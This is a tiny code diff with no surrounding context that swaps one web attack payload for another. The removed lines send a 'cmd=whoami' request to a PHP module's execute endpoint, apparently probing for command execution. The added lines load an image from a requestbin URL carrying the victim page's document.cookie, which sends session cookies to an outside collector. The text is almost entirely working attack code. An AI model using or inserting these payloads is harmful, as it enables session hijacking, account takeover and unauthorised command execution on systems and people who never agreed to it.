@@ -1,3 +1,2 @@
-fetch('/sede/modules.php?mod=portal&file=execute&cmd=whoami', { method: 'GET' })
-  .then(response => response.text())
-  .then(data => console.log(data));
+var img = new Image();
+img.src = 'http://requestbin.webengage.org/1dhvd161?cookie=' + encodeURIComponent(document.cookie);
